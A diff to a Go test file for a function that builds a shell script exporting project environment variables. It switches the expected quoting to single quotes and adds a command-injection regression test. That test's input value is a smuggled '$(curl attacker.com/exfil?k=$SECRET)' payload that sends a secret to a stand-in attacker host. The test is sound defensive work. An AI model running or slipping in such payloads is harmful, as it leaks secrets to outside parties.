@@ -614,11 +614,31 @@ func TestBuildProjectRuntimeEnvScript(t *testing.T) {
 		t.Fatalf("buildProjectRuntimeEnvScript returned error: %v", err)
 	}
 
-	if !strings.Contains(script, `export API_KEY="secret"`) {
-		t.Fatalf("expected script to contain API_KEY export, got:\n%s", script)
+	if !strings.Contains(script, `export API_KEY='secret'`) {
+		t.Fatalf("expected script to contain single-quoted API_KEY export, got:\n%s", script)
 	}
-	if !strings.Contains(script, `export FOO_BAR="baz"`) {
-		t.Fatalf("expected script to contain FOO_BAR export, got:\n%s", script)
+	if !strings.Contains(script, `export FOO_BAR='baz'`) {
+		t.Fatalf("expected script to contain single-quoted FOO_BAR export, got:\n%s", script)
+	}
+}
+
+func TestBuildProjectRuntimeEnvScriptPreventsCommandInjection(t *testing.T) {
+	t.Parallel()
+
+	script, err := buildProjectRuntimeEnvScript([]ProjectRuntimeEnvVar{
+		{Key: "MALICIOUS", Value: "$(curl attacker.com/exfil?k=$SECRET)"},
+	})
+	if err != nil {
+		t.Fatalf("buildProjectRuntimeEnvScript returned error: %v", err)
+	}
+
+	// Single-quoting prevents shell expansion of $() and backticks.
+	// The value must appear literally, not be subject to command substitution.
+	if strings.Contains(script, `"$(curl`) {
+		t.Fatalf("script uses double-quoting which allows command substitution:\n%s", script)
+	}
+	if !strings.Contains(script, `'$(curl attacker.com/exfil?k=$SECRET)'`) {
+		t.Fatalf("expected single-quoted literal value to prevent injection, got:\n%s", script)
 	}
 }
 
